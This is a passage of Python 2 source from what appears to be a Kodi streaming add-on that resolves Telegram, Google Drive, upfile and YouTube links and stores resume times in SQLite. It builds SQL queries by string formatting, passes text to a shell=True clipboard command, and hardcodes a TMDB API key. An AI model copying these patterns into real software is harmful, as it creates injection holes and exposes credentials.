             aa=addLink3( name, link,99,True, iconimage,fanart,description,data=data,original_title=original_title,id=id,season=season,episode=episode,num_in_list=num)
             all.append(aa)
       num=num+1

def remove_to_fav(plot):
    file_data=[]
    change=0
    cache.clear(['save_file'])
    if os.path.exists(save_file):
        f = open(save_file, 'r')
        file_data = f.readlines()
        f.close()
    
    if plot+'\n' in file_data:
      file_data.pop(file_data.index(plot+'\n'))
      change=1
    if change>0:
       
          file = open(save_file, 'w')
          file.write('\n'.join(file_data))
          file.close()
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הוסר[/COLOR]' % COLOR2)
def remove_fav_num(plot):
    file_data=[]
    change=0
    cache.clear(['save_file'])
    if os.path.exists(save_file):
        f = open(save_file, 'r')
        file_data = f.readlines()
        f.close()

    if len(file_data)>=int(plot):
      file_data.pop(int(plot))
      change=1
    if change>0:
       
          file = open(save_file, 'w')
          file.write('\n'.join(file_data))
          file.close()
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הוסר[/COLOR]' % COLOR2)
          xbmc.executebuiltin('Container.Refresh')
def play_direct(final_link,data,name,no_subs,tmdb,season,episode,original_title,description,resume,resume_time):
        video_data={}
        if season!=None and season!="%20" and season!="0":
           video_data['TVshowtitle']=original_title.replace('%20',' ').replace('%3a',':').replace('%27',"'").replace('_',".")
           video_data['mediatype']='tvshow'
           
        else:
           video_data['mediatype']='movies'
        if season!=None and season!="%20" and season!="0":
           tv_movie='tv'
           url2='http://api.themoviedb.org/3/tv/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        else:
           tv_movie='movie'
           
           url2='http://api.themoviedb.org/3/movie/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        if 'tt' not in tmdb:
             try:
                logging.warning(url2)
                
                imdb_id=requests.get(url2).json()['external_ids']['imdb_id']
                logging.warning(imdb_id)
             except Exception as e:
                logging.warning('IMDB err:'+str(e))
                imdb_id=" "
        else:
             imdb_id=tmdb
        video_data['title']=name.replace('.mp4','').replace('.avi','').replace('.mkv','').replace('-','').replace('Google Drive','').replace('[COLOR lightblue][B]','').replace('[/B][/COLOR]','').replace(' 360','').replace(' 480','').replace(' 720','').replace(' 1080','').strip()
        logging.warning(video_data['title'])
        video_data['Writer']=tmdb
        video_data['season']=season
        video_data['episode']=episode
        video_data['plot']='from_telemedia'
        video_data['imdb']=imdb_id
        video_data['code']=imdb_id

        video_data['imdbnumber']=imdb_id
        
        video_data['imdb_id']=imdb_id
        video_data['IMDBNumber']=imdb_id
        video_data['genre']=imdb_id
        if no_subs=='1':
            video_data[u'mpaa']=unicode('heb')
        
        listItem = xbmcgui.ListItem(video_data['title'], path=final_link) 
        listItem.setInfo(type='Video', infoLabels=video_data)


        listItem.setProperty('IsPlayable', 'true')

       
        
        if resume_time==-1:
            return 0
        logging.warning('resume_time:'+str(resume_time))
        ok=xbmc.Player().play(final_link,listitem=listItem)
def play(name,url,data,iconimage,fan,no_subs,tmdb,season,episode,original_title,description,resume,dd,nextup='false'):

    '''
    link='http://127.0.0.1:%s/'%listen_port+url
    logging.warning('Play Link:'+link)
    video_data={}
    video_data['title']=name
    video_data['poster']=fan

    video_data['icon']=iconimage
    
    listItem = xbmcgui.ListItem(video_data['title'], path=link) 
    listItem.setInfo(type='Video', infoLabels=video_data)


    listItem.setProperty('IsPlayable', 'true')

   
       
    ok=xbmc.Player().play(link,listitem=listItem)
    xbmc.executebuiltin("Dialog.Close(busydialog)")
    '''
    l_data=json.loads(url)

    if Addon.getSetting("test")=='998':
        logging.warning('Check Resume')
        if not resume:
            resume_time=get_resume(tmdb,name,season,episode)
        else:
            resume_time=resume
        
        if resume_time==-1:
            return 0
        dialog = xbmcgui.DialogBusy()
        dialog.create()
        dp = xbmcgui.DialogProgress()
        dp.create('Please Wait...','Playing', '','')
        dp.update(0, 'Please Wait...','Playing', '' )
        c_id=l_data['c_id']
        m_id=l_data['m_id']
        logging.warning('1')
        f_link=get_direct_bot_link(c_id,m_id)
       
        if f_link!='Found':
            
            play_direct(f_link,data,name,no_subs,tmdb,season,episode,original_title,description,resume,resume_time)
            logging.warning('2')
            broken_play=True
            w_time=int(Addon.getSetting("wait_size"))
            logging.warning('3')
            for _ in xrange(w_time):
                dp.update(0,'Playing...',Addon.getLocalizedString(32040)+' : '+str(_), '' )
                try:
                    vidtime = xbmc.Player().getTime()
                except:
                    vidtime=0
                    pass
                if xbmc.Player().isPlaying() and vidtime>0:
                    broken_play=False
                    
                    break
                if dp.iscanceled():
                    dp.close()
                    broken_play=False
                    xbmc.Player().stop()
                    break
                time.sleep(0.100)
            logging.warning('4')
            if resume_time>0:
                try:
                    xbmc.Player().seekTime(int(float(resume_time)))
                except Exception as e:
                    logging.warning('Seek Err:'+str(e))
                    pass
            dp.close()
            g_timer=None
            while (not xbmc.abortRequested) and (xbmc.Player().isPlaying()):
                 try:
                    vidtime = xbmc.Player().getTime()
                 except:
                    vidtime = 0
                 try:
                    g_timer=xbmc.Player().getTime()
                    g_item_total_time=xbmc.Player().getTotalTime()
                 except:
                    pass
                 time.sleep(0.1)
            
            
            if resume_time!=-1 and g_timer:
                update_db_link(tmdb,name,season,episode,g_timer,g_item_total_time)
            xbmc.executebuiltin("Dialog.Close(busydialog)")
            return 0
    
    try:
        url=l_data['id']
        if 0:
        
            free_space=xbmc.getInfoLabel('System.FreeSpace')
            logging.warning('free_space:'+str(free_space))
            free_space_int=[int(s) for s in free_space.split() if s.isdigit()]
            logging.warning('free_space:'+str(free_space_int))
            if 'MB' in free_space:
                total_free=int(free_space_int[0])
            elif 'GB' in free_space:
                total_free=int(free_space_int[0])*1024
            elif 'KB' in free_space:
                total_free=int(free_space_int[0])/1024
            else:
                total_free=0
           
            if (total_free<1600):
                ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32127),(Addon.getLocalizedString(32128)))
                if ok:
                    HOME= xbmc.translatePath('special://home/')
                    USERDATA= os.path.join(HOME,      'userdata')
                    ADDONS           = os.path.join(HOME,      'addons')
                    
                    THUMBS= os.path.join(USERDATA,  'Thumbnails')
                    TEMPDIR= xbmc.translatePath('special://temp')
                    PACKAGES= os.path.join(ADDONS,    'packages')
                    remove_all=[THUMBS,TEMPDIR,PACKAGES]
                    for items in remove_all:
                        shutil.rmtree(items,ignore_errors=True, onerror=None)
                    DATABASE         = os.path.join(USERDATA,  'Database')
                    arr = os.listdir(DATABASE)
                    for items in arr:
                        if 'Textures' in items:
                            try:
                                os.remove(os.path.join(DATABASE,items))
                            except:
                                pass
                free_space=xbmc.getInfoLabel('System.FreeSpace')
                logging.warning('free_space:'+str(free_space))
                free_space_int=[int(s) for s in free_space.split() if s.isdigit()]
                logging.warning('free_space:'+str(free_space_int))
                if 'MB' in free_space:
                    total_free=int(free_space_int[0])
                elif 'GB' in free_space:
                    total_free=int(free_space_int[0])*1024
                elif 'KB' in free_space:
                    total_free=int(free_space_int[0])/1024
                else:
                    total_free=0
                if (total_free<1600):
                    xbmcgui.Dialog().ok('Error occurred','Still not Enough space, free space:'+str(free_space))
                    #sys.exit()
        monitor=TelePlayer()
        broken_play,resume_time=monitor.playTeleFile(url,data,name,no_subs,tmdb,season,episode,original_title,description,resume,l_data,dd,nextup='true')
        try_next_player=Addon.getSetting("next_player_option")=='true'
        if resume_time==-1:
            return 0
        if broken_play and try_next_player:
            dp = xbmcgui.DialogProgress()
            dp.create('Please Wait...','Playing', '','')
            dp.update(0, 'Please Wait...','Playing', '' )
            # xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia ERR','Broken Play Trying another method'))
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]מנסה לנגן באמצעות דרך אחרת[/COLOR]' % COLOR2)
            c_id=l_data['c_id']
            m_id=l_data['m_id']
            
            f_link=get_direct_bot_link(c_id,m_id)
            play_direct(f_link,data,name,no_subs,tmdb,season,episode,original_title,description,resume,resume_time)
            logging.warning('2')
            broken_play=True
            w_time=int(Addon.getSetting("wait_size"))
            logging.warning('3')
            for _ in xrange(w_time):
                dp.update(0,'Playing...',Addon.getLocalizedString(32040)+' : '+str(_), '' )
                try:
                    vidtime = xbmc.Player().getTime()
                except:
                    vidtime=0
                    pass
                if xbmc.Player().isPlaying() and vidtime>0:
                    broken_play=False
                    
                    break
                if dp.iscanceled():
                    dp.close()
                    broken_play=False
                    xbmc.Player().stop()
                    break
                time.sleep(0.100)
            logging.warning('4')
            if resume_time>0:
                try:
                    xbmc.Player().seekTime(int(float(resume_time)))
                except Exception as e:
                    logging.warning('Seek Err:'+str(e))
                    pass
            dp.close()
            g_timer=None
            while (not xbmc.abortRequested) and (xbmc.Player().isPlaying()):
                 try:
                    vidtime = xbmc.Player().getTime()
                 except:
                    vidtime = 0
                 try:
                    g_timer=xbmc.Player().getTime()
                    g_item_total_time=xbmc.Player().getTotalTime()
                 except:
                    pass
                 time.sleep(0.1)
            
            
            if resume_time!=-1 and g_timer:
                update_db_link(tmdb,name,season,episode,g_timer,g_item_total_time)
            xbmc.executebuiltin("Dialog.Close(busydialog)")
            return 0
    except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN Main:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
        
    
def get_upfile_det(url):
    name=''
    logging.warning(url)
    headers = {
  
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    
    'Content-Type': 'application/json;charset=utf-8',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    }
    html=requests.get(url,headers=headers).content
    
       
    regex='<title>(.+?)</title>.+?<input type="hidden" value="(.+?)" name="hash">'
    match=re.compile(regex,re.DOTALL).findall(html)
    if len(match)==0:
         xbmcgui.Dialog().ok('Error occurred','Link is down')
         return 0,0
    for name,link in match:
      id=url.split('/')[-1]
      id=id.replace('.html','').replace('.htm','')
      
      playlink='http://down.upfile.co.il/downloadnew/file/%s/%s'%(id,link)
    return playlink,name

def get_upfile_det(url):
    name=''
    logging.warning(url)
    headers = {
  
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    
    'Content-Type': 'application/json;charset=utf-8',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    }
    html=requests.get(url,headers=headers).content
    
       
    regex='<title>(.+?)</title>.+?<input type="hidden" value="(.+?)" name="hash">'
    match=re.compile(regex,re.DOTALL).findall(html)
    if len(match)==0:
         xbmcgui.Dialog().ok('Error occurred','Link is down')
         return 0,0
    for name,link in match:
      id=url.split('/')[-1]
      id=id.replace('.html','').replace('.htm','')
      
      playlink='http://down.upfile.co.il/downloadnew/file/%s/%s'%(id,link)
    return playlink,name

def googledrive_download(id):
    #download('http://mirrors.kodi.tv/addons/jarvis/script.module.requests/script.module.requests-2.9.1.zip','script.module.requests')
    #dis_or_enable_addon('script.module.requests','auto')
    #import requests,time
    keys=[]
    #id_pre=id.split('=')
    #id=id_pre[len(id_pre)-1]
    
    def get_confirm_token(response):
        
        for cookie in response:
            logging.warning('cookie.name')
            logging.warning(cookie.name)
            backup_cookie= cookie.value
            if 'download_warning' in cookie.name:
                logging.warning(cookie.value)
                logging.warning('cookie.value')
                return cookie.value
            return backup_cookie

        return None

    
    URL = "https://docs.google.com/uc?export=download"

    #session = requests.Session()

    #response = session.get(URL, params = { 'id' : id }, stream = True)
    import urllib2
    import cookielib

    from cookielib import CookieJar

    cj = CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    # input-type values from the html form
    formdata =  { 'id' : id }
    data_encoded = urllib.urlencode(formdata)
    logging.warning(URL+'&'+ data_encoded)
    response = opener.open(URL+'&'+ data_encoded)
    content = response.read()
    cookies={}
    cook=[]
    
    for cookie in cj:
         cook.append(cookie.name+'='+cookie.value)
         cookies[cookie.name]=cookie.value
         logging.warning( cookie)
    token = get_confirm_token(cj)
    logging.warning(token)
    if token:
        params = { 'id' : id, 'confirm' : token }
        headers = {'Access-Control-Allow-Headers': 'Content-Length','Cookie':';'.join(cook)}
        
        data_encoded = urllib.urlencode(params)
        return (URL+'&'+ data_encoded+"|"+ urllib.urlencode(headers))
        #response = opener.open(URL+'&'+ data_encoded)
        #chunk_read(response, report_hook=chunk_report,dp=dp,destination=destination,filesize=filesize)
        

    #save_response_content(response, destination)
    return(keys)
def fix_q(quality):
    
    
    if '1080' in quality:
      f_q=0
    elif '720' in quality:
      f_q=1
    elif '480' in quality:
      f_q=2
   
    elif '360' in quality or 'sd' in quality.lower():
      f_q=3
   
    return f_q
def getPublicStream(url):
        import cookielib
        import mediaurl

        pquality=-1
        pformat=-1
        acodec=-1
        fmtlist=[]
        mediaURLs = []
  
       
        cookies = cookielib.LWPCookieJar()
        handlers = [
            urllib2.HTTPHandler(),
            urllib2.HTTPSHandler(),
            urllib2.HTTPCookieProcessor(cookies)
            ]
        opener = urllib2.build_opener(*handlers)
        logging.warning(url)
        req = urllib2.Request(url)

        req.add_header('User-agent',__USERAGENT__)
        result= opener.open(req)
        for cookie in cookies:
            if cookie.name=='DRIVE_STREAM':
              value=cookie.value

        #response = urllib2.urlopen(req)
        
        response_data = result.read()
        #response.close()




        regex='<title>(.+?)</title>'
        name=re.compile(regex).findall(response_data)[0]
        for r in re.finditer('\"fmt_list\"\,\"([^\"]+)\"' ,
                             response_data, re.DOTALL):
            fmtlist = r.group(1)

        title = ''
        for r in re.finditer('\"title\"\,\"([^\"]+)\"' ,
                             response_data, re.DOTALL):
            title = r.group(1)


        if fmtlist==[]:
            return 'Download',None,name
        itagDB={}
        containerDB = {'x-flv':'flv', 'webm': 'WebM', 'mp4;+codecs="avc1.42001E,+mp4a.40.2"': 'MP4'}
        for r in re.finditer('(\d+)/(\d+)x(\d+)/(\d+/\d+/\d+)\&?\,?' ,
                               fmtlist, re.DOTALL):
              (itag,resolution1,resolution2,codec) = r.groups()

              if codec == '9/0/115':
                itagDB[itag] = {'resolution': resolution2, 'codec': 'h.264/aac'}
              elif codec == '99/0/0':
                itagDB[itag] = {'resolution': resolution2, 'codec': 'VP8/vorbis'}
              else:
                itagDB[itag] = {'resolution': resolution2}

        for r in re.finditer('\"url_encoded_fmt_stream_map\"\,\"([^\"]+)\"' ,
                             response_data, re.DOTALL):
            urls = r.group(1)


        
        urls = urllib.unquote(urllib.unquote(urllib.unquote(urllib.unquote(urllib.unquote(urls)))))
        urls = re.sub('\\\\u003d', '=', urls)
        urls = re.sub('\\\\u0026', '&', urls)


#        urls = re.sub('\d+\&url\='+self.PROTOCOL, '\@', urls)
        urls = re.sub('\&url\='+ 'https://', '\@', urls)

#        for r in re.finditer('\@([^\@]+)' ,urls):
#          videoURL = r.group(0)
#        videoURL1 = self.PROTOCOL + videoURL


        # fetch format type and quality for each stream
        count=0
        
        for r in re.finditer('\@([^\@]+)' ,urls):
                videoURL = r.group(1)
                for q in re.finditer('itag\=(\d+).*?type\=video\/([^\&]+)\&quality\=(\w+)' ,
                             videoURL, re.DOTALL):
                    (itag,container,quality) = q.groups()
                    count = count + 1
                    order=0
                    if pquality > -1 or pformat > -1 or acodec > -1:
                        if int(itagDB[itag]['resolution']) == 1080:
                            if pquality == 0:
                                order = order + 1000
                            elif pquality == 1:
                                order = order + 3000
                            elif pquality == 3:
                                order = order + 9000
                        elif int(itagDB[itag]['resolution']) == 720:
                            if pquality == 0:
                                order = order + 2000
                            elif pquality == 1:
                                order = order + 1000
                            elif pquality == 3:
                                order = order + 9000
                        elif int(itagDB[itag]['resolution']) == 480:
                            if pquality == 0:
                                order = order + 3000
                            elif pquality == 1:
                                order = order + 2000
                            elif pquality == 3:
                                order = order + 1000
                        elif int(itagDB[itag]['resolution']) < 480:
                            if pquality == 0:
                                order = order + 4000
                            elif pquality == 1:
                                order = order + 3000
                            elif pquality == 3:
                                order = order + 2000
                    try:
                        if itagDB[itag]['codec'] == 'VP8/vorbis':
                            if acodec == 1:
                                order = order + 90000
                            else:
                                order = order + 10000
                    except :
                        order = order + 30000

                    try:
                        if containerDB[container] == 'MP4':
                            if pformat == 0 or pformat == 1:
                                order = order + 100
                            elif pformat == 3 or pformat == 4:
                                order = order + 200
                            else:
                                order = order + 300
                        elif containerDB[container] == 'flv':
                            if pformat == 2 or pformat == 3:
                                order = order + 100
                            elif pformat == 1 or pformat == 5:
                                order = order + 200
                            else:
                                order = order + 300
                        elif containerDB[container] == 'WebM':
                            if pformat == 4 or pformat == 5:
                                order = order + 100
                            elif pformat == 0 or pformat == 1:
                                order = order + 200
                            else:
                                order = order + 300
                        else:
                            order = order + 100
                    except :
                        pass

                    try:
                        mediaURLs.append( mediaurl.mediaurl('https://' + videoURL, itagDB[itag]['resolution'] + ' - ' + containerDB[container] + ' - ' + itagDB[itag]['codec'], str(itagDB[itag]['resolution'])+ '_' + str(order+count), order+count, title=title))
                    except KeyError:
                        mediaURLs.append(mediaurl.mediaurl('https://'+ videoURL, itagDB[itag]['resolution'] + ' - ' + container, str(itagDB[itag]['resolution'])+ '_' + str(order+count), order+count, title=title))
        
        return mediaURLs,value,name
        
def googledrive_resolve(id):
    logging.warning(id)
    global tv_mode
    links_data,cookie,name=getPublicStream('https://drive.google.com/file/d/'+id+'/view')
    if links_data=='Download':
        return 'Download',name
    mediaURLs = sorted(links_data)
    options = []
    all_mediaURLs=[]
    for mediaURL in mediaURLs:
        logging.warning(mediaURL.qualityDesc)
        if '4k' in mediaURL.qualityDesc:
           
           options.append('4000')
        elif '1080' in mediaURL.qualityDesc:
           
           options.append('1080')
        elif '720' in mediaURL.qualityDesc:
           
           options.append('720')
        elif '480' in mediaURL.qualityDesc:
           
           options.append('480')
        elif '360' in mediaURL.qualityDesc:
           
           options.append('360')
        elif '240' in mediaURL.qualityDesc:
           
           options.append('240')
        else:
           
           options.append('0')
        all_mediaURLs.append((mediaURL.url,fix_q(mediaURL.qualityDesc)))
    qualities=options
    qualities=sorted(options, key=lambda x: x[0], reverse=False)
    all_mediaURLs=sorted(all_mediaURLs, key=lambda x: x[1], reverse=False)
    
    if Addon.getSetting("auto_q")=='true':
            all_n=[]
            playbackURL,qul = all_mediaURLs[0]
            playbackURL=playbackURL+'||Cookie=DRIVE_STREAM%3D'+cookie
            all_n.append(name+' - [COLOR lightblue][B]'+str(options[0])+'[/B][/COLOR]')
    else:
        #ret = xbmcgui.Dialog().select("Choose", options)
        #if ret==-1:
        #    sys.exit()
        all_l=[]
        all_n=[]
        count=0
        for items in mediaURLs:
            all_l.append(items.url+'||Cookie=DRIVE_STREAM%3D'+cookie)
            all_n.append(name+' - [COLOR lightblue][B]'+str(options[count])+'[/B][/COLOR]')
            count+=1
        playbackURL = '$$$'.join(all_l)#[ret].url


    if len(all_n)==1:
        all_n=all_n[0]
    return playbackURL ,all_n

def get_resume(tmdb,saved_name,season,episode):
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""season TEXT, ""episode TEXT,""playtime TEXT,""total TEXT, ""free TEXT);" % 'playback')
        dbcon.commit()
        logging.warning('TMDB:'+str(tmdb))
        if len(str(tmdb))>2:
            dbcur.execute("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(tmdb,str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
            logging.warning("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(tmdb,str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
        else:
            dbcur.execute("SELECT * FROM playback where name='%s' and season='%s' and episode='%s'"%(saved_name.replace("'","%27"),str(season).replace('%20','0').replace(' ','0'),str(episode).replace('%20','0').replace(' ','0')))
        match_playtime = dbcur.fetchone()
        if match_playtime!=None:

            name_r,timdb_r,season_r,episode_r,playtime,totaltime,free=match_playtime
            res={}
            res['wflag']=False
            res['resumetime']=playtime
            res['totaltime']=totaltime
        else:
            res=False
            
        set_runtime=0
        if res:
            if not res['wflag']:

                if res['resumetime']!=None:

                    #Resume From 
                    choose_time=Addon.getLocalizedString(32042)+time.strftime("%H:%M:%S", time.gmtime(float(res['resumetime'])))
                    
                    if float(res['resumetime'])>=(0.98*(float(res['totaltime']))):
                        selection=1
                        clicked=1
                    else:
                      
                        window = selection_time('Menu',choose_time)
                        window.doModal()
                        selection = window.get_selection()
                        clicked=window.clicked
                        del window
                    if clicked==0:
                        set_runtime=-1
                        return -1
                    if selection==-1:
                       stop_auto_play=1
                       resume_time=-1
                       return 0
                    if selection==0:
                        
                        set_runtime=float(res['resumetime'])
                        set_total=res['totaltime']
                        
                        
                    elif selection==1:
                        
                        
                        set_runtime=0
                        set_total=res['totaltime']
        dbcur.close()
        dbcon.close()
        return set_runtime
def update_db_link(tmdb,saved_name,season,episode,g_timer,g_item_total_time):
        logging.warning('TMDB:'+str(saved_name))
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""season TEXT, ""episode TEXT,""playtime TEXT,""total TEXT, ""free TEXT);" % 'playback')
        dbcon.commit()
        season=season.replace('%20','0').replace(' ','0')
        episode=episode.replace('%20','0').replace(' ','0')
        if len(str(tmdb))<2  and tmdb!='%20':
            only_name=True
            dbcur.execute("SELECT * FROM playback where name='%s' and season='%s' and episode='%s'"%(saved_name.replace("'","%27"),season,episode))
        else:
            only_name=False
            dbcur.execute("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(tmdb,season,episode))
        match = dbcur.fetchall()
        logging.warning(match)
        
        if match==None:
          dbcur.execute("INSERT INTO playback Values ('%s','%s','%s','%s','%s','%s','%s');" %  (saved_name.replace("'","%27"),tmdb,season,episode,str(g_timer),str(g_item_total_time),' '))
          dbcon.commit()
        else:
           if len(match)>0:
            name,timdb,season,episode,playtime,totaltime,free=match[0]
            if str(g_timer)!=playtime:
                if only_name:
                    dbcur.execute("UPDATE playback SET playtime='%s' where name='%s' and  season='%s' and episode='%s'"%(str(g_timer),saved_name.replace("'","%27"),season,episode))
                else:
                    dbcur.execute("UPDATE playback SET playtime='%s' where tmdb='%s' and  season='%s' and episode='%s'"%(str(g_timer),tmdb,season,episode))
                dbcon.commit()
           else:
                dbcur.execute("INSERT INTO playback Values ('%s','%s','%s','%s','%s','%s','%s');" %  (saved_name.replace("'","%27"),tmdb,season,episode,str(g_timer),str(g_item_total_time),' '))
                dbcon.commit()
        dbcur.close()
        dbcon.close()
def copy2clip(txt):
    import subprocess
    platform = sys.platform
    logging.warning(platform)
    if platform == 'win32':
        try:
            cmd = 'echo ' + txt.strip() + '|clip'
            return subprocess.check_call(cmd, shell=True)
            pass
        except:
            pass
    elif platform == 'linux2':
        try:
            from subprocess import Popen, PIPE

            p = Popen(['xsel', '-pi'], stdin=PIPE)
            p.communicate(input=txt)
        except:
            pass
    else:
        pass
    pass
def play_link(name,url,icon,fan,no_subs,tmdb,season,episode,original_title):
    if 1:#try:
        
        
        dialog = xbmcgui.DialogBusy()
        dialog.create()
        all_n=[]
        logging.warning('inlink:'+url)
        
        if '$$$' in url:
            final_links=[]
            all_urls=url.split('$$$')
            for ite in all_urls:
                if ite not in final_links:
                    final_links.append(ite)
            all_urls=final_links
        else:
            all_urls=[url]
            logging.warning('NO DOLAR')
        logging.warning(len(all_urls))
        logging.warning('len(all_urls)')
        logging.warning((all_urls))
        if len(all_urls)>1:
            for itt in all_urls:
                
                if 'upfile' in url:
                    f_link,name=get_upfile_det(itt)
                    if f_link==0:
                        return 0
                    
                    all_n.append(name)
                else:
                    all_n.append(re.compile('//(.+?)/').findall(itt)[0])
            ret = xbmcgui.Dialog().select("choose", all_n)
            if ret!=-1:
                if 'google' in all_urls[ret] and '?' in all_urls[ret] and 'google.com/open?' not in all_urls[ret]:
                    all_urls[ret]=all_urls[ret].split('?')[0]
                all_urls=[all_urls[ret]]
                
            else:
              return 0
        else:
            all_urls=[all_urls[0]]
        all_l=[]
        all_n=[]
        
        for items in all_urls:
            if 'upfile' in url:
                f_link,name=get_upfile_det(items)
                if f_link==0:
                    return 0
                all_l.append(f_link)
                all_n.append(name)
            if 'youtu' in items:
                if 'youtu.be' in items:
                    items=requests.get(items).url
                logging.warning(items)
                regex='v\=(.+?)$'
                video_id=re.compile(regex).findall(items)[0]
                if 'list=' in items:
                    video_id=items.split ('list=')[1 ]
                    playback_url = 'plugin://plugin.video.youtube/play/?playlist_id=%s&order=shuffle&play=1'%video_id
                else:
                    playback_url = 'plugin://plugin.video.youtube/play/?video_id=%s' % video_id
                xbmc.executebuiltin('XBMC.RunPlugin(%s)'%playback_url)
                return 0
                logging.warning(playback_url)
                all_l.append(playback_url)
                all_n.append(name)
            if 'drive.google' in items or 'docs.google' in items:
              
              if 'docs.googleusercontent.com' in items:
                logging.warning('Returning')
                return 0
              
              if '=' in items and 'usp=' not in items:
                id=items.split('=')[-1]
            
              else:
               regex='/d/(.+?)/view'
               match=re.compile(regex).findall(items)
               if len(match)>0:
                 id=match[0]
               else:
                 regex='/d/(.+?)/preview'
                 match=re.compile(regex).findall(items)
                 if len(match)>0:
                    id=match[0]
                 else:
                    regex='/d/(.+?)$'
                    match=re.compile(regex).findall(items)
                    if len(match)>0:
                        id=match[0]
                    else:
                        regex='id=(.+?)$'
                        match=re.compile(regex).findall(items)
                        id=match[0]
              f_link,name= googledrive_resolve(id)
              if f_link=='Download':
                   f_link= googledrive_download(id)
                   name='Download '+name
              count=0
              if '$$$' in f_link:
                for item in f_link.split('$$$'):
                    all_l.append(item)
                    all_n.append(name[count])
                    count+=1
              else:
                all_l.append(f_link)
                all_n.append(name)
        if len(all_l)==1:
            final_link=all_l[0]
            name=all_n[0]
        elif len(all_l)>0:
            #"choose"
            ret = xbmcgui.Dialog().select(Addon.getLocalizedString(32028), all_n)
            if ret!=-1:
                final_link=all_l[ret]
                name=all_n[ret]
            else:
              return 0
        else:
            final_link=all_urls[0]
        if 'twitch' in final_link:
            twitch_p=os.path.join(xbmc.translatePath("special://home/addons/"),'plugin.video.twitch')
            if os.path.exists(twitch_p):
            
                regex='https://www.twitch.tv/(.+?)(?:$| |\r|\n|\t)'
                #ids=final_link.split('/')
                f_id=re.compile(regex).findall(final_link)[0]
                
                
                xbmc.executebuiltin('ActivateWindow(10025,"plugin://plugin.video.twitch/?content=streams&mode=search_results&query=%s",return)'%f_id)          
            else:
                copy2clip('https://github.com/MrSprigster/Twitch-on-Kodi/releases/download/2.4.8/plugin.video.twitch-2.4.8.zip')
                xbmcgui.Dialog().ok('Error occurred','You need Twich addon to play this link\n link was copied to clipboard')
                
            return 0
        logging.warning('final_link:'+final_link)
        logging.warning(name)
        video_data={}
        if season!=None and season!="%20" and season!="0":
           video_data['TVshowtitle']=original_title.replace('%20',' ').replace('%3a',':').replace('%27',"'").replace('_',".")
           video_data['mediatype']='tvshow'
           
        else:
           video_data['mediatype']='movies'
        if season!=None and season!="%20" and season!="0":
           tv_movie='tv'
           url2='http://api.themoviedb.org/3/tv/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        else:
           tv_movie='movie'
           
           url2='http://api.themoviedb.org/3/movie/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        if 'tt' not in tmdb:
             try:
                logging.warning(url2)
                
                imdb_id=requests.get(url2).json()['external_ids']['imdb_id']
                logging.warning(imdb_id)
             except Exception as e:
                logging.warning('IMDB err:'+str(e))
                imdb_id=" "
        else:
             imdb_id=tmdb
        video_data['title']=name.replace('.mp4','').replace('.avi','').replace('.mkv','').replace('-','').replace('Google Drive','').replace('[COLOR lightblue][B]','').replace('[/B][/COLOR]','').replace(' 360','').replace(' 480','').replace(' 720','').replace(' 1080','').strip()
        logging.warning(video_data['title'])
        video_data['Writer']=tmdb
        video_data['season']=season
        video_data['episode']=episode
        video_data['plot']='from_telemedia'
        video_data['imdb']=imdb_id
        video_data['code']=imdb_id

        video_data['imdbnumber']=imdb_id
        
        video_data['imdb_id']=imdb_id
        video_data['IMDBNumber']=imdb_id
        video_data['genre']=imdb_id
        if no_subs=='1':
            video_data[u'mpaa']=unicode('heb')
        
        listItem = xbmcgui.ListItem(video_data['title'], path=final_link) 
        listItem.setInfo(type='Video', infoLabels=video_data)


        listItem.setProperty('IsPlayable', 'true')

       
        resume_time=get_resume(tmdb,name,season,episode)
        if resume_time==-1:
            return 0
        logging.warning('resume_time:'+str(resume_time))
        ok=xbmc.Player().play(final_link,listitem=listItem)
        w_time=int(Addon.getSetting("wait_size"))
        fail_play=True
        for _ in xrange(w_time):
            
            try:
